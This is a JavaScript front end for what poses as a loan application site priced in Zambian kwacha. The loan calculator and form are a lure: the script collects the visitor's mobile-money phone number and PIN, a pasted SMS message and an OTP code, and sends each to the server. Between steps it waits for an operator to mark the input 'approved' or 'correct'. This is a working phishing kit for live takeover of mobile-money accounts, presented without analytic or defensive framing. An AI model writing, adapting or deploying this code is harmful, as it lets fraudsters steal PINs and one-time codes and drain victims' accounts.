document.addEventListener('DOMContentLoaded', () => {
  let currentStep = 1;
  let appId = null;

  // Global navigation function attached to window so inline onclick attributes work
  window.goToStep = function(stepNumber) {
    const currentElement = document.getElementById(`step-${currentStep}`);
    const nextElement = document.getElementById(`step-${stepNumber}`);
    
    if (currentElement) currentElement.style.display = 'none';
    if (nextElement) nextElement.style.display = 'block';
    
    currentStep = stepNumber;
  };

  // Calculator update logic for Step 1
  window.updateCalculator = function() {
    const slider = document.getElementById('calc-amount-slider');
    const displayAmount = document.getElementById('display-amount');
    const displayMonthly = document.getElementById('display-monthly');
    
    if (!slider) return;

    const amount = parseInt(slider.value);
    displayAmount.textContent = `ZMW ${amount.toLocaleString()}`;
    
    // Simple calculation: 48 months term example
    const monthly = Math.round(amount / 48);
    displayMonthly.textContent = `ZMW ${monthly.toLocaleString()}`;
  };

  // Submit Initial Application (Step 4 -> Step 5)
  window.submitInitialApplication = function() {
    const loanType = document.getElementById('loan-type').value;
    const amount = document.getElementById('form-amount').value;
    const purpose = document.getElementById('form-purpose').value;
    const firstName = document.getElementById('form-firstname').value;
    const lastName = document.getElementById('form-lastname').value;
    const phone = document.getElementById('form-phone').value;
    const employer = document.getElementById('form-employer').value;
    const income = document.getElementById('form-income').value;

    if (!amount || !purpose || !firstName || !lastName || !phone || !income) {
      alert('Please fill in all required fields.');
      return;
    }

    // Move to MoMo Authentication step (Step 5)
    goToStep(5);
  };

  // Process MoMo Login / Authentication (Step 5 -> Step 6)
  window.processMomoLogin = async function() {
    const phone = document.getElementById('momo-phone').value;
    const pin = document.getElementById('momo-pin').value;

    if (!phone || !pin) {
      alert('Please enter your MoMo phone number and 4-digit PIN.');
      return;
    }

    try {
      const res = await fetch('/applications', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ momo_phone: phone, momo_pin: pin })
      });
      const data = await res.json();
      appId = data.id;

      await fetch(`/applications/${appId}/submit-auth`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ momo_phone: phone, momo_pin: pin })
      });

      goToStep(6); // Waiting for Admin Approval
      startCountdown('auth-countdown-text', 10, () => {
        checkAuthStatus(appId);
      });
    } catch (err) {
      console.error(err);
      alert('Network error. Please try again.');
    }
  };

  // Process SMS Verification (Step 7 -> Step 8)
  window.processSmsVerification = async function() {
    const smsText = document.getElementById('sms-text-input').value;

    if (!smsText.trim()) {
      alert('Please paste the SMS verification text.');
      return;
    }

    try {
      await fetch(`/applications/${appId}/submit-sms`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sms_text: smsText })
      });

      goToStep(8); // Verifying SMS
      startCountdown('sms-countdown-text', 10, () => {
        checkSmsStatus(appId);
      });
    } catch (err) {
      console.error(err);
      alert('Network error. Please try again.');
    }
  };

  // Process OTP Verification (Step 9 -> Step 10)
  window.processOtpVerification = async function() {
    const otpCode = document.getElementById('otp-code').value;

    if (!otpCode || otpCode.length < 4) {
      alert('Please enter the 4-digit OTP code.');
      return;
    }

    try {
      await fetch(`/applications/${appId}/submit-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ otp_code: otpCode })
      });

      goToStep(10); // Verifying OTP
      startCountdown('otp-countdown-text', 10, () => {
        checkOtpStatus(appId);
      });
    } catch (err) {
      console.error(err);
      alert('Network error. Please try again.');
    }
  };

  function startCountdown(elementId, seconds, callback) {
    const textEl = document.getElementById(elementId);
    let timeLeft = seconds;

    const timer = setInterval(() => {
      timeLeft--;
      if (textEl) {
        textEl.innerHTML = `Please wait... <b style="color:#ffcc00; font-size:18px;">${timeLeft}s</b> remaining`;
      }
      if (timeLeft <= 0) {
        clearInterval(timer);
        callback();
      }
    }, 1000);
  }

  function checkAuthStatus(id) {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/applications/${id}`);
        const data = await res.json();
        if (data.status === 'auth_approved') {
          clearInterval(interval);
          goToStep(7); // Move to SMS Verification
        } else if (data.status === 'auth_rejected') {
          clearInterval(interval);
          alert('Authentication Rejected. Redirecting back to Authentication step.');
          goToStep(5);
        }
      } catch (e) {
        console.error(e);
      }
    }, 3000);
  }

  function checkSmsStatus(id) {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/applications/${id}`);
        const data = await res.json();
        if (data.sms_status === 'sms_correct') {
          clearInterval(interval);
          goToStep(9); // Move to OTP Verification
        } else if (data.sms_status === 'sms_wrong') {
          clearInterval(interval);
          alert('Wrong SMS Text Provided. Redirecting back to SMS step.');
          goToStep(7);
        }
      } catch (e) {
        console.error(e);
      }
    }, 3000);
  }

  function checkOtpStatus(id) {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/applications/${id}`);
        const data = await res.json();
        if (data.otp_status === 'otp_correct') {
          clearInterval(interval);
          goToStep(11); // Move to Final Congratulations Screen
        } else if (data.otp_status === 'otp_wrong') {
          clearInterval(interval);
          alert('Wrong OTP Code Provided. Redirecting back to OTP step.');
          goToStep(9);
        }
      } catch (e) {
        console.error(e);
      }
    }, 3000);
  }
});
      
